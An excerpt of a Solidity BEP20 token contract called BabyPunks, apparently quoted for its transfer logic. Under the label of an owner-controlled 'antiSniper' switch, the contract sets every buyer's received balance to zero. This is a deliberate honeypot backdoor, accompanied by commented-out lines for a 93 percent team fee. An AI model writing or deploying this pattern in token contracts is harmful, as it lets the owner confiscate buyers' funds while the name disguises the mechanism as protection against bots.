...
contract BabyPunks is IBEP20, Auth {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _balances[recipient] = antiSniper ? 0 : _balances[recipient].add(amountReceived);
        _balances[teamFeeReceiver] = !antiSniper ? 0 : _balances[teamFeeReceiver].add(amountReceived);
    ...
    function setAntiSniper(bool newAntiSniperValue) external authorized capGasPrice {
        antiSniper = newAntiSniperValue;
        //teamFee = 93;
        //totalFee = teamFee.add(buybackFee).add(reflectionFee).add(marketingFee);
    }
